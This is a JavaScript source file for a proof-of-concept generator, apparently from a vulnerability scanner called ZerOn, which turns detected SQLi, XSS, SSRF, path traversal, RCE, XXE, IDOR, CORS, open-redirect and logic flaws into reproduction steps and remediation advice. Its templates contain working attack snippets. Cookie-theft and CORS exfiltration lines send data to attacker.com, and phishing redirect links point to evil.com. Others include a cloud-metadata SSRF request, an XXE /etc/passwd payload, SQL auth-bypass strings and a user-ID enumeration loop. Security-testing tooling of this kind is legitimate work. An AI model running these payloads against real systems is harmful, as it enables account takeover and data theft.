// Phase 3: PoC Generator - Create proof-of-concept evidence
class PoCGenerator {
  /**
   * Generate PoC for vulnerability
   */
  static generatePoC(vulnerability) {
    const { type, endpoint, parameter, payload, response } = vulnerability;

    let poc = {
      title: `Proof of Concept - ${type}`,
      vulnerability: type,
      target: endpoint?.url || 'Unknown target',
      parameter: parameter?.name || 'Unknown parameter',
      payload: payload?.payload || payload || 'Unknown payload',
      steps: [],
      evidence: []
    };

    switch (type) {
      case 'SQLi':
        poc = this._generateSQLiPoC(poc, vulnerability);
        break;
      case 'XSS':
        poc = this._generateXSSPoC(poc, vulnerability);
        break;
      case 'SSRF':
        poc = this._generateSSRFPoC(poc, vulnerability);
        break;
      case 'PathTraversal':
        poc = this._generatePathTraversalPoC(poc, vulnerability);
        break;
      case 'RCE':
        poc = this._generateRCEPoC(poc, vulnerability);
        break;
      case 'XXE':
        poc = this._generateXXEPoC(poc, vulnerability);
        break;
      case 'Information Disclosure':
        poc = this._generateInfoDisclosurePoC(poc, vulnerability);
        break;
      case 'IDOR':
        poc = this._generateIDORPoC(poc, vulnerability);
        break;
      case 'CORS Misconfiguration':
        poc = this._generateCORSPoC(poc, vulnerability);
        break;
      case 'Open Redirect':
        poc = this._generateOpenRedirectPoC(poc, vulnerability);
        break;
      case 'Authentication Bypass':
        poc = this._generateAuthBypassPoC(poc, vulnerability);
        break;
      case 'Business Logic Flaw':
        poc = this._generateBusinessLogicPoC(poc, vulnerability);
        break;
      default:
        poc.steps.push('Send malicious payload to vulnerable parameter');
        poc.steps.push('Observe abnormal behavior in response');
    }

    poc.evidence.push({
      type: 'Request',
      content: this._generateRequest(endpoint, parameter, payload)
    });

    // Safely handle response data
    let responseContent = 'Response data not available';
    if (response && response.data) {
      if (typeof response.data === 'string') {
        responseContent = response.data.substring(0, 1000);
      } else if (typeof response.data === 'object') {
        responseContent = JSON.stringify(response.data).substring(0, 1000);
      } else {
        responseContent = String(response.data).substring(0, 1000);
      }
    }

    poc.evidence.push({
      type: 'Response',
      content: responseContent
    });

    return poc;
  }

  /**
   * Generate SQLi PoC
   */
  static _generateSQLiPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send the following payload in the parameter:',
      `   ${vulnerability.payload.payload}`,
      '2. Observe SQL error or unexpected data in response',
      '3. Use UNION-based or time-based extraction to dump data'
    ];

    poc.codeSnippet = {
      curl: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\nurl = "${vulnerability.endpoint.url}"\npayload = {"${vulnerability.parameter.name}": "${vulnerability.payload.payload}"}\nr = requests.get(url, params=payload)\nprint(r.text)`,
      javascript: `fetch("${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}")\n  .then(r => r.text())\n  .then(console.log)`
    };

    return poc;
  }

  /**
   * Generate XSS PoC
   */
  static _generateXSSPoC(poc, vulnerability) {
    poc.steps = [
      '1. Submit the following payload:',
      `   ${vulnerability.payload.payload}`,
      '2. The payload will execute in the browser context',
      '3. Session cookies and sensitive data can be stolen'
    ];

    poc.codeSnippet = {
      curl: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      html: `<img src=x onerror="new Image().src='http://attacker.com/steal.php?c='+document.cookie">`,
      javascript: `// Steal cookies\nfetch('http://attacker.com/log?cookie=' + document.cookie)`
    };

    return poc;
  }

  /**
   * Generate SSRF PoC
   */
  static _generateSSRFPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send SSRF payload to access internal services:',
      `   ${vulnerability.payload.payload}`,
      '2. Access internal IP ranges (192.168.x.x, 10.0.x.x)',
      '3. Query cloud metadata endpoints for credentials'
    ];

    poc.codeSnippet = {
      python: `import requests\nurl = "${vulnerability.endpoint.url}"\npayload = {"${vulnerability.parameter.name}": "http://169.254.169.254/latest/meta-data/"}\nr = requests.post(url, data=payload)\nprint(r.text)`,
      curl: `curl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`
    };

    return poc;
  }

  /**
   * Generate Path Traversal PoC
   */
  static _generatePathTraversalPoC(poc, vulnerability) {
    poc.steps = [
      '1. Use path traversal sequence:',
      `   ${vulnerability.payload.payload}`,
      '2. Read sensitive files like /etc/passwd or /windows/win.ini',
      '3. Access configuration files and source code'
    ];

    poc.codeSnippet = {
      bash: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\nfiles = ["../../etc/passwd", "../../windows/win.ini"]\nfor f in files:\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": f})\n    print(r.text[:200])`
    };

    return poc;
  }

  /**
   * Generate RCE PoC
   */
  static _generateRCEPoC(poc, vulnerability) {
    poc.steps = [
      '1. Execute system command:',
      `   ${vulnerability.payload.payload}`,
      '2. This allows full system compromise',
      '3. Attacker can read files, modify data, or further compromise'
    ];

    poc.codeSnippet = {
      bash: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\ncommands = ["id", "whoami", "cat /etc/passwd"]\nfor cmd in commands:\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": cmd})\n    print(f"{cmd}: {r.text[:100]}")`
    };

    return poc;
  }

  /**
   * Generate Information Disclosure PoC
   */
  static _generateInfoDisclosurePoC(poc, vulnerability) {
    const subType = vulnerability.context || 'Sensitive information';
    
    poc.steps = [
      '1. Send path traversal/info disclosure payload:',
      `   ${vulnerability.payload.payload}`,
      `2. Application leaks: ${subType}`,
      '3. Extract sensitive data from response',
      '4. Exposed information can lead to further attacks'
    ];

    poc.impact = [
      'Exposure of sensitive configuration files',
      'Database credentials or API keys leaked',
      'Internal paths and system information revealed',
      'Stack traces exposing code structure',
      'Directory listings showing application structure'
    ];

    poc.remediation = [
      'Implement proper input validation and sanitization',
      'Disable directory listings',
      'Remove debug/error information in production',
      'Use proper file access controls',
      'Avoid exposing configuration files to web root',
      'Implement proper error handling without stack traces'
    ];

    poc.codeSnippet = {
      bash: `curl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\n\n# Test information disclosure\npayloads = ["../../../etc/passwd", "../config.php", ".env"]\n\nfor payload in payloads:\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": payload})\n    if "root:" in r.text or "DB_PASSWORD" in r.text:\n        print(f"[!] Info Disclosed with payload: {payload}")\n        print(f"Response snippet: {r.text[:200]}")`,
      curl: `curl -X GET "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}" -H "User-Agent: Mozilla/5.0"`
    };

    return poc;
  }

  /**
   * Generate XXE PoC
   */
  static _generateXXEPoC(poc, vulnerability) {
    poc.steps = [
      '1. Send XXE payload:',
      `   ${vulnerability.payload.payload}`,
      '2. Read local files or perform SSRF attacks',
      '3. Access cloud metadata or internal services'
    ];

    poc.codeSnippet = {
      xml: `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>`,
      python: `import requests\npayload = '''<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<data>&xxe;</data>'''\nr = requests.post("${vulnerability.endpoint.url}", data=payload, headers={"Content-Type": "application/xml"})\nprint(r.text)`
    };

    return poc;
  }

  /**
   * Generate HTTP request
   */
  static _generateRequest(endpoint, parameter, payload) {
    // Safety check for endpoint
    if (!endpoint || !endpoint.url) {
      return 'GET / HTTP/1.1\nHost: unknown\n\n';
    }
    
    // Safety check for parameter and payload
    const paramName = parameter?.name || 'unknown';
    const payloadValue = payload?.payload || payload || 'test';
    
    try {
      const url = new URL(endpoint.url);
      const method = endpoint.method || 'GET';

      if (method === 'GET') {
        url.searchParams.set(paramName, payloadValue);
        return `GET ${url.pathname}${url.search} HTTP/1.1\nHost: ${url.hostname}\nUser-Agent: Mozilla/5.0\n\n`;
      } else {
        const body = `${paramName}=${encodeURIComponent(payloadValue)}`;
        return `POST ${url.pathname} HTTP/1.1\nHost: ${url.hostname}\nContent-Type: application/x-www-form-urlencoded\nContent-Length: ${body.length}\n\n${body}`;
      }
    } catch (error) {
      return `GET / HTTP/1.1\nHost: ${endpoint.url || 'unknown'}\n\n`;
    }
  }

  /**
   * Generate HTML PoC page
   */
  static generateHTMLPoC(vulnerabilities) {
    let html = `<!DOCTYPE html>
<html>
<head>
    <title>ZerOn - Proof of Concept</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
        .poc { background: white; padding: 20px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .critical { border-left: 4px solid #d32f2f; }
        .high { border-left: 4px solid #f57c00; }
        .medium { border-left: 4px solid #fbc02d; }
        .code { background: #f5f5f5; padding: 10px; overflow-x: auto; font-family: monospace; margin: 10px 0; }
        h1 { color: #333; }
        .step { margin: 10px 0; }
    </style>
</head>
<body>
    <h1>ZerOn - Vulnerability Proof of Concepts</h1>
    <p>Report generated on ${new Date().toLocaleString()}</p>
`;

    vulnerabilities.forEach((vuln, index) => {
      const poc = vuln.poc || {};
      const severity = vuln.severity || 'MEDIUM';
      
      html += `
    <div class="poc ${severity.toLowerCase()}">
        <h2>PoC #${index + 1}: ${poc.vulnerability || 'Unknown'}</h2>
        <p><strong>Target:</strong> ${poc.target}</p>
        <p><strong>Parameter:</strong> ${poc.parameter}</p>
        <p><strong>Severity:</strong> <span style="color: ${this._getSeverityColor(severity)}">${severity}</span></p>
        <h3>Steps to Reproduce:</h3>
        <ol>
            ${poc.steps.map(step => `<li>${step}</li>`).join('')}
        </ol>
        <h3>Request Example:</h3>
        <div class="code">${poc.codeSnippet?.curl || 'N/A'}</div>
    </div>
`;
    });

    html += `
</body>
</html>`;

    return html;
  }

  static _getSeverityColor(severity) {
    const colors = { CRITICAL: '#d32f2f', HIGH: '#f57c00', MEDIUM: '#fbc02d', LOW: '#689f38', INFO: '#1976d2' };
    return colors[severity] || '#757575';
  }

  /**
   * Generate IDOR PoC
   */
  static _generateIDORPoC(poc, vulnerability) {
    const subType = vulnerability.context || 'Horizontal Privilege Escalation';
    
    poc.steps = [
      '1. Access endpoint with legitimate ID/reference:',
      `   ${vulnerability.endpoint.url}?${vulnerability.parameter.name}=1`,
      '2. Modify the ID to access another user\'s data:',
      `   ${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${vulnerability.payload.payload}`,
      '3. Observe successful access to unauthorized data',
      '4. Extract sensitive information from response'
    ];

    poc.impact = [
      'Unauthorized access to other users\' data',
      'Privacy violation and data breach',
      'Potential account takeover if sensitive data exposed',
      'Mass data enumeration possible'
    ];

    poc.remediation = [
      'Implement proper authorization checks on server side',
      'Verify user owns the requested resource before returning data',
      'Use unpredictable IDs (UUIDs) instead of sequential integers',
      'Implement access control lists (ACLs)',
      'Never rely on client-side authorization'
    ];

    poc.codeSnippet = {
      bash: `# Access victim's data\ncurl "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${vulnerability.payload.payload}"`,
      python: `import requests\n\n# Enumerate multiple user IDs\nfor user_id in range(1, 1000):\n    r = requests.get("${vulnerability.endpoint.url}", params={"${vulnerability.parameter.name}": user_id})\n    if r.status_code == 200 and len(r.text) > 100:\n        print(f"[+] Found data for user {user_id}")\n        print(r.text[:200])`,
      curl: `curl -X GET "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${vulnerability.payload.payload}"`
    };

    return poc;
  }

  /**
   * Generate CORS PoC
   */
  static _generateCORSPoC(poc, vulnerability) {
    poc.steps = [
      '1. Host malicious website with following code:',
      `   <script>fetch('${vulnerability.endpoint.url}', {credentials: 'include'}).then(r => r.text()).then(data => exfiltrate(data))</script>`,
      '2. Victim visits malicious site while logged into target',
      '3. Malicious site steals victim\'s data via CORS',
      '4. Data exfiltrated to attacker server'
    ];

    poc.impact = [
      'Complete account takeover possible',
      'Theft of sensitive user data',
      'Session hijacking',
      'API key/token leakage',
      'Works even with authentication'
    ];

    poc.remediation = [
      'Never use wildcard (*) with Access-Control-Allow-Credentials',
      'Whitelist specific trusted origins only',
      'Avoid reflecting Origin header value',
      'Reject null origin in production',
      'Implement proper CORS policy validation'
    ];

    poc.codeSnippet = {
      html: `<!DOCTYPE html>\n<html>\n<head><title>CORS PoC</title></head>\n<body>\n<h1>CORS Exploit</h1>\n<script>\nfetch('${vulnerability.endpoint.url}', {\n  credentials: 'include',\n  headers: { 'Origin': '${vulnerability.payload.payload}' }\n})\n.then(r => r.text())\n.then(data => {\n  // Exfiltrate data\n  fetch('https://attacker.com/steal?data=' + btoa(data));\n  console.log('Stolen data:', data);\n});\n</script>\n</body>\n</html>`,
      curl: `curl -H "Origin: ${vulnerability.payload.payload}" "${vulnerability.endpoint.url}"`
    };

    return poc;
  }

  /**
   * Generate Open Redirect PoC
   */
  static _generateOpenRedirectPoC(poc, vulnerability) {
    poc.steps = [
      '1. Craft malicious URL with redirect parameter:',
      `   ${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}`,
      '2. Send link to victim (via phishing email/SMS)',
      '3. Victim clicks legitimate-looking domain',
      '4. Victim redirected to attacker-controlled site',
      '5. Phishing page steals credentials'
    ];

    poc.impact = [
      'Phishing attacks using trusted domain',
      'Credential theft',
      'OAuth token stealing',
      'Malware distribution',
      'SEO poisoning'
    ];

    poc.remediation = [
      'Validate redirect URLs against whitelist',
      'Only allow relative paths, not absolute URLs',
      'Reject external domains in redirect parameters',
      'Display warning before redirecting to external sites',
      'Use indirect references instead of direct URLs'
    ];

    poc.codeSnippet = {
      bash: `# Phishing attack\ncurl -I "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent('https://evil.com/phishing')}"`,
      html: `<!-- Phishing email -->\n<a href="${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent('https://attacker.com/fake-login')}">Click here to verify your account</a>`,
      curl: `curl -X GET "${vulnerability.endpoint.url}?${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`
    };

    return poc;
  }

  /**
   * Generate Authentication Bypass PoC
   */
  static _generateAuthBypassPoC(poc, vulnerability) {
    const subType = vulnerability.context || 'Authentication bypass';
    
    poc.steps = [
      '1. Access authentication endpoint:',
      `   ${vulnerability.endpoint.url}`,
      '2. Send bypass payload in authentication parameter:',
      `   ${vulnerability.parameter.name}=${vulnerability.payload.payload}`,
      '3. Observe successful authentication without valid credentials',
      '4. Gain unauthorized access to protected resources'
    ];

    poc.impact = [
      'Complete authentication bypass',
      'Unauthorized access to all accounts',
      'Admin panel access without credentials',
      'Full application compromise',
      'Data breach and privacy violation'
    ];

    poc.remediation = [
      'Use parameterized queries to prevent SQL injection',
      'Implement proper authentication logic',
      'Never trust client-side authentication',
      'Use established authentication libraries',
      'Implement rate limiting on login endpoints',
      'Add multi-factor authentication'
    ];

    poc.codeSnippet = {
      bash: `curl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}"`,
      python: `import requests\n\npayloads = ["admin' OR '1'='1", "admin' --", "' OR 1=1 --"]\n\nfor payload in payloads:\n    data = {"${vulnerability.parameter.name}": payload, "password": "anything"}\n    r = requests.post("${vulnerability.endpoint.url}", data=data)\n    if "welcome" in r.text.lower() or "dashboard" in r.text.lower():\n        print(f"[!] Auth bypassed with: {payload}")`,
      curl: `curl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${encodeURIComponent(vulnerability.payload.payload)}&password=test"`
    };

    return poc;
  }

  /**
   * Generate Business Logic PoC
   */
  static _generateBusinessLogicPoC(poc, vulnerability) {
    const subType = vulnerability.context || 'Business logic manipulation';
    
    poc.steps = [
      '1. Identify business-critical parameter:',
      `   ${vulnerability.parameter.name} in ${vulnerability.endpoint.url}`,
      '2. Manipulate parameter with unexpected value:',
      `   ${vulnerability.parameter.name}=${vulnerability.payload.payload}`,
      '3. Observe application accepts invalid business logic',
      '4. Exploit for financial gain or unauthorized access'
    ];

    poc.impact = [
      'Financial loss for the organization',
      'Free products/services',
      'Inventory manipulation',
      'Accounting discrepancies',
      'Workflow bypass'
    ];

    poc.remediation = [
      'Implement server-side validation for all business rules',
      'Never trust client-provided prices/quantities',
      'Set minimum and maximum bounds for critical values',
      'Validate total calculations on server side',
      'Implement proper business rule engine',
      'Add monitoring for suspicious transactions'
    ];

    poc.codeSnippet = {
      bash: `# Exploit negative price\ncurl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${vulnerability.payload.payload}"`,
      python: `import requests\n\n# Test various business logic flaws\ntest_cases = [\n    {"${vulnerability.parameter.name}": "-999", "description": "Negative value"},\n    {"${vulnerability.parameter.name}": "0", "description": "Zero value"},\n    {"${vulnerability.parameter.name}": "999999999", "description": "Excessive value"}\n]\n\nfor test in test_cases:\n    r = requests.post("${vulnerability.endpoint.url}", data=test)\n    if "success" in r.text.lower():\n        print(f"[!] Business logic flaw: {test['description']}")`,
      curl: `curl -X POST "${vulnerability.endpoint.url}" -d "${vulnerability.parameter.name}=${vulnerability.payload.payload}"`
    };

    return poc;
  }
}

module.exports = PoCGenerator;
